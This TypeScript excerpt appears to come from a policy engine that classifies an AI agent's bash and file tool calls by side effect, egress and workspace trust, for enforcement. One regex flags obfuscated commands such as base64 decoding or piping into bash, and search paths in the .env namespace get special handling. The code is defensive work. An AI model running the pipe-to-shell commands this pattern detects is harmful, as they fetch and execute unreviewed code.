      workspaceTrusted: options.workspaceTrusted,
      declaredTempRoots: options.declaredTempRoots,
      ...(touchOperand === undefined ? {} : { exactTouchOperand: touchOperand }),
      ...(options.lstat === undefined ? {} : { lstat: options.lstat }),
      ...(options.readlink === undefined ? {} : { readlink: options.readlink }),
      ...(options.realpath === undefined ? {} : { realpath: options.realpath }),
    });
    targetAwareWrite ??= classifiedPart.targetAwareWrite;
    const partSegments = classifiedPart.segments;
    segments.push(...partSegments);
    if (partSegments.length === 0) continue;

    for (let index = firstIndex + 1; index < segments.length; index += 1) {
      connect(index - 1, index, "unknown");
    }
    if (previousPartLastIndex !== undefined) {
      connect(previousPartLastIndex, firstIndex, edgeRelationForOperator(part.operatorToPrevious));
    }
    previousPartLastIndex = segments.length - 1;

    const nextOperator = shell.parts[partIndex + 1]?.operatorToPrevious;
    const propagatesDirectory = nextOperator === "and" || nextOperator === "sequence";
    if (classifiedPart.nextDirectory !== undefined && propagatesDirectory) {
      basePath = classifiedPart.nextDirectory;
    }
    if (classifiedPart.modeledCd && nextOperator !== undefined && nextOperator !== "and") {
      const index = segments.length;
      segments.push(unknownShellSyntaxSegment(`cd-cwd-not-proven: ${part.text}`));
      connect(previousPartLastIndex, index, "unknown");
      previousPartLastIndex = index;
    }
  }

  const supportedOpaqueHeredoc =
    shell.unsupportedReasons.length === 1 &&
    shell.unsupportedReasons[0] === "heredoc" &&
    hasArbitraryCodeSegment(segments) &&
    isSingleOpaqueHeredocCommand(command);
  if (shell.unsupported && !supportedOpaqueHeredoc && command.trim() !== "") {
    const index = segments.length;
    segments.push(unknownShellSyntaxSegment(command));
    if (previousPartLastIndex !== undefined) connect(previousPartLastIndex, index, "unknown");
  }

  return {
    segments,
    edges,
    kind: shellCompositionKind(edges, relations),
    ...(targetAwareWrite === undefined ? {} : { targetAwareWrite }),
  };
}

function isArbitraryCodeSegment(entry: SideEffectSegmentT): boolean {
  return entry.targets.some((target) => {
    if (target.kind !== "command") return false;
    return arbitraryCodeReason(target.value, argvFromCommand(target.value)) !== undefined;
  });
}

function isUnknownSegment(entry: SideEffectSegmentT): boolean {
  return (
    entry.modifiers.includes("unknown") ||
    entry.effectKinds.includes("unknown") ||
    entry.scopes.includes("unknown")
  );
}

function hasArbitraryCodeSegment(segments: readonly SideEffectSegmentT[]): boolean {
  return segments.some(
    (entry) =>
      entry.effectKinds.includes("unknown") &&
      entry.scopes.includes("unknown") &&
      isArbitraryCodeSegment(entry),
  );
}

function arbitraryCodeReasons(segments: readonly SideEffectSegmentT[]): string[] {
  const reasons = new Set<string>();
  for (const entry of segments) {
    for (const target of entry.targets) {
      if (target.kind !== "command") continue;
      const reason = arbitraryCodeReason(target.value, argvFromCommand(target.value));
      if (reason !== undefined) reasons.add(reason);
    }
  }
  return [...reasons];
}

function unknownSegmentsAreArbitraryCode(segments: readonly SideEffectSegmentT[]): boolean {
  const unknownSegments = segments.filter(isUnknownSegment);
  return unknownSegments.length > 0 && unknownSegments.every(isArbitraryCodeSegment);
}

function classifierForCommand(
  command: string,
  segments: readonly SideEffectSegmentT[],
  options: { readonly sandboxContainedArbitraryCode: boolean },
) {
  if (options.sandboxContainedArbitraryCode) {
    return {
      confidence: "conservative" as const,
      reasons: ["sandbox_contained_arbitrary_code", ...arbitraryCodeReasons(segments)],
    };
  }
  if (segments.some((entry) => entry.modifiers.includes("unknown"))) {
    return {
      confidence: /\b(base64|xxd|bash\s+<\(|\|\s*bash)\b/u.test(command)
        ? ("obfuscated" as const)
        : ("unknown" as const),
      reasons: ["fail_closed_command_shape"],
    };
  }
  return {
    confidence: "conservative" as const,
    reasons: ["epic-2.5-starter-policy-pack"],
  };
}

export function buildPolicyInputForBash(
  params: ExecuteParams | PolicyExplainParams,
  options: PolicyInputBuildOptions,
): PolicyInputT {
  const env = options.env ?? process.env;
  const commandValue = params.toolCall.args["command"];
  const command = typeof commandValue === "string" ? commandValue : "";
  const argv = argvFromCommand(command);
  const shell = classifyShellCommand(command, {
    workspaceRoot: options.workspaceRoot,
    env,
    workspaceTrusted: options.workspaceTrusted === true,
    declaredTempRoots: options.declaredTempRoots ?? [],
    ...(options.lstat === undefined ? {} : { lstat: options.lstat }),
    ...(options.readlink === undefined ? {} : { readlink: options.readlink }),
    ...(options.realpath === undefined ? {} : { realpath: options.realpath }),
  });

  const aggregate = aggregateSegments(shell.segments);
  const explicitEgress = extractExplicitEgressTarget(command);
  const sandboxExtensions = sandboxExtension(options.sandboxContainment, {
    workspaceRoot: options.workspaceRoot,
    env,
    arbitraryCode:
      hasArbitraryCodeSegment(shell.segments) && unknownSegmentsAreArbitraryCode(shell.segments),
    workspaceTrusted: options.workspaceTrusted === true,
  });
  const tempExtensions: JsonObjectT | undefined =
    shell.targetAwareWrite === undefined
      ? undefined
      : {
          "keel.temp": {
            resolvedWriteTargets: [shell.targetAwareWrite.target.normalized!],
            declaredWriteTargets: shell.targetAwareWrite.declaredTemp
              ? [shell.targetAwareWrite.target.normalized!]
              : [],
          },
        };
  const extensions =
    sandboxExtensions === undefined && tempExtensions === undefined
      ? undefined
      : { ...sandboxExtensions, ...tempExtensions };
  const classifier = classifierForCommand(command, shell.segments, {
    sandboxContainedArbitraryCode: sandboxExtensions !== undefined,
  });
  const staticCapability = staticCapabilityForTool("bash");

  return PolicyInput.parse({
    tool: { name: params.toolCall.name, args: params.toolCall.args },
    normalized: { argv, decodedLayers: [] },
    sideEffect: {
      taxonomyVersion: SIDE_EFFECT_TAXONOMY_VERSION,
      staticCapability,
      dynamic: {
        ...aggregate,
        composition: {
          kind: shell.kind,
          segments: shell.segments,
          edges: shell.edges,
        },
        classifier: {
          name: "phase2a-transitional-bash-classifier",
          version: "3",
          confidence: classifier.confidence,
          reasons: classifier.reasons,
        },
      },
      ...(extensions === undefined ? {} : { extensions }),
    },
    workspace: { path: options.workspaceRoot, trusted: options.workspaceTrusted ?? false },
    provenance: params.provenanceContext,
    egress: {
      isEgress: explicitEgress.kind === "domain",
      domain: explicitEgress.kind === "domain" ? explicitEgress.domain : null,
      gitRemote:
        argv[0] === "git" && argv[1] === "remote" && ["add", "set-url"].includes(argv[2] ?? "")
          ? gitRemoteHost(argv.at(-1))
          : null,
    },
    session: {
      id:
        "sessionId" in params
          ? params.sessionId
          : (options.sessionId ?? DEFAULT_EXPLAIN_SESSION_ID),
      mode: "enforced",
      promptCountThisSession: 0,
    },
    principal: { osUser: env["USER"] ?? "local" },
  });
}

export function buildPolicyInputForRead(
  params: ExecuteParams | PolicyExplainParams,
  options: PolicyInputBuildOptions,
): PolicyInputT {
  const env = options.env ?? process.env;
  const args = parseReadArgs(params.toolCall.args);
  const target = typedPathTarget(args.path, options, env);
  const segments = [
    segment({
      effectKinds: ["fs_read"],
      scopes: [typedPathScope(target, options.workspaceRoot, env)],
      targets: [target],
      modifiers: [],
    }),
  ];
  const aggregate = aggregateSegments(segments);

  return PolicyInput.parse({
    tool: { name: params.toolCall.name, args: params.toolCall.args },
    normalized: { argv: [], decodedLayers: [] },
    sideEffect: {
      taxonomyVersion: SIDE_EFFECT_TAXONOMY_VERSION,
      staticCapability: staticCapabilityForTool("read"),
      dynamic: {
        ...aggregate,
        composition: {
          kind: "atomic",
          segments,
          edges: [],
        },
        classifier: {
          name: "phase2a-typed-read-classifier",
          version: "1",
          confidence: "conservative",
          reasons: ["epic-2.15-typed-read"],
        },
      },
    },
    workspace: { path: options.workspaceRoot, trusted: options.workspaceTrusted ?? false },
    provenance: params.provenanceContext,
    egress: {
      isEgress: false,
      domain: null,
      gitRemote: null,
    },
    session: {
      id:
        "sessionId" in params
          ? params.sessionId
          : (options.sessionId ?? DEFAULT_EXPLAIN_SESSION_ID),
      mode: "enforced",
      promptCountThisSession: 0,
    },
    principal: { osUser: env["USER"] ?? "local" },
  });
}

type TypedFilePolicyToolName = "read" | "search" | "write" | "edit";

function typedPolicyInput(
  params: ExecuteParams | PolicyExplainParams,
  options: PolicyInputBuildOptions,
  config: {
    readonly toolName: TypedFilePolicyToolName;
    readonly segments: readonly SideEffectSegmentT[];
    readonly reason: string;
  },
): PolicyInputT {
  const env = options.env ?? process.env;
  const aggregate = aggregateSegments(config.segments);

  return PolicyInput.parse({
    tool: { name: params.toolCall.name, args: params.toolCall.args },
    normalized: { argv: [], decodedLayers: [] },
    sideEffect: {
      taxonomyVersion: SIDE_EFFECT_TAXONOMY_VERSION,
      staticCapability: staticCapabilityForTool(config.toolName),
      dynamic: {
        ...aggregate,
        composition: {
          kind: "atomic",
          segments: config.segments,
          edges: [],
        },
        classifier: {
          name: `phase2a-typed-${config.toolName}-classifier`,
          version: "1",
          confidence: "conservative",
          reasons: [config.reason],
        },
      },
    },
    workspace: { path: options.workspaceRoot, trusted: options.workspaceTrusted ?? false },
    provenance: params.provenanceContext,
    egress: {
      isEgress: false,
      domain: null,
      gitRemote: null,
    },
    session: {
      id:
        "sessionId" in params
          ? params.sessionId
          : (options.sessionId ?? DEFAULT_EXPLAIN_SESSION_ID),
      mode: "enforced",
      promptCountThisSession: 0,
    },
    principal: { osUser: env["USER"] ?? "local" },
  });
}

function typedFileToolTargetFromRawArgs(
  toolName: TypedFilePolicyToolName,
  args: JsonObjectT,
): string {
  if (toolName === "search") {
    const path = args["path"];
    if (typeof path === "string" && path.length > 0) return path;
    const glob = args["glob"];
    if (typeof glob === "string" && glob.length > 0) return glob;
    const pattern = args["pattern"];
    if (args["kind"] === "filename" && typeof pattern === "string" && pattern.length > 0) {
      return pattern;
    }
    return ".";
  }
  const path = args["path"];
  return typeof path === "string" && path.length > 0 ? path : ".";
}

function typedSegment(
  effectKind: "fs_read" | "fs_write",
  target: SideEffectTargetT,
  options: PolicyInputBuildOptions,
  env: NodeJS.ProcessEnv,
): SideEffectSegmentT {
  return segment({
    effectKinds: [effectKind],
    scopes: [typedPathScope(target, options.workspaceRoot, env)],
    targets: [target],
    modifiers: [],
  });
}

export function buildUntrustedTypedFileToolPolicyInput(
  params: ExecuteParams | PolicyExplainParams,
  options: PolicyInputBuildOptions,
): PolicyInputT {
  const toolName = params.toolCall.name;
  if (toolName !== "read" && toolName !== "search" && toolName !== "write" && toolName !== "edit") {
    throw new PolicyEvaluationError(`not a typed file tool: ${toolName}`);
  }
  const env = options.env ?? process.env;
  const untrustedOptions = { ...options, workspaceTrusted: false };
  const rawTarget = typedFileToolTargetFromRawArgs(toolName, params.toolCall.args);
  const target = untrustedTypedPathTarget(rawTarget, untrustedOptions, env);
  const segments =
    toolName === "edit"
      ? [
          typedSegment("fs_read", target, untrustedOptions, env),
          typedSegment("fs_write", target, untrustedOptions, env),
        ]
      : [
          typedSegment(
            toolName === "write" ? "fs_write" : "fs_read",
            target,
            untrustedOptions,
            env,
          ),
        ];
  return typedPolicyInput(params, untrustedOptions, {
    toolName,
    reason: "typed-file-tool-workspace-trust-deny",
    segments,
  });
}

export function buildPolicyInputForSearch(
  params: ExecuteParams | PolicyExplainParams,
  options: PolicyInputBuildOptions,
): PolicyInputT {
  const env = options.env ?? process.env;
  const rawArgs = params.toolCall.args;
  const args = parseSearchArgs(rawArgs);
  const rawPath = typeof rawArgs["path"] === "string" ? rawArgs["path"] : undefined;
  const searchGlobTarget = (glob: string): string => {
    if (rawPathMentionsDotEnvNamespace(glob)) return glob;
    return searchExecutionScopeFromGlob(glob) ?? ".";
  };
  const target =
    rawPath !== undefined
      ? typedPathTarget(rawPath, options, env)
      : args.kind === "filename"
        ? typedPathTarget(
            rawPathMentionsDotEnvNamespace(args.pattern) ? args.pattern : ".",
            options,
            env,
          )
        : args.glob !== undefined
          ? typedPathTarget(searchGlobTarget(args.glob), options, env)
          : pathTarget(".", options.workspaceRoot, env);
  return typedPolicyInput(params, options, {
    toolName: "search",
    reason: "epic-2.15-typed-search",
    segments: [
      segment({
        effectKinds: ["fs_read"],
        scopes: [typedPathScope(target, options.workspaceRoot, env)],
        targets: [target],
        modifiers: [],
      }),
    ],
  });
}

export function buildPolicyInputForWrite(
  params: ExecuteParams | PolicyExplainParams,
  options: PolicyInputBuildOptions,
): PolicyInputT {
  const env = options.env ?? process.env;
  const args = parseWriteArgs(params.toolCall.args);
  const target = typedPathTarget(args.path, options, env);
  return typedPolicyInput(params, options, {
    toolName: "write",
    reason: "epic-2.15-typed-write",
    segments: [
      segment({
        effectKinds: ["fs_write"],
        scopes: [typedPathScope(target, options.workspaceRoot, env)],
        targets: [target],
        modifiers: [],
      }),
    ],
  });
}

export function buildPolicyInputForEdit(
  params: ExecuteParams | PolicyExplainParams,
  options: PolicyInputBuildOptions,
): PolicyInputT {
  const env = options.env ?? process.env;
  const args = parseEditArgs(params.toolCall.args);
  const target = typedPathTarget(args.path, options, env);
  return typedPolicyInput(params, options, {
    toolName: "edit",
    reason: "epic-2.15-typed-edit",
    segments: [
      segment({
        effectKinds: ["fs_read"],
        scopes: [typedPathScope(target, options.workspaceRoot, env)],
        targets: [target],
        modifiers: [],
      }),
      segment({
        effectKinds: ["fs_write"],
        scopes: [pathScope(target.normalized!, options.workspaceRoot, env)],
        targets: [target],
        modifiers: [],
      }),
    ],
  });
}

export function buildPolicyInputForToolCall(
  params: ExecuteParams | PolicyExplainParams,
  options: PolicyInputBuildOptions,
): PolicyInputT {
  if (params.toolCall.name === "read") return buildPolicyInputForRead(params, options);
  if (params.toolCall.name === "search") return buildPolicyInputForSearch(params, options);
  if (params.toolCall.name === "write") return buildPolicyInputForWrite(params, options);
  if (params.toolCall.name === "edit") return buildPolicyInputForEdit(params, options);
  return buildPolicyInputForBash(params, options);
}
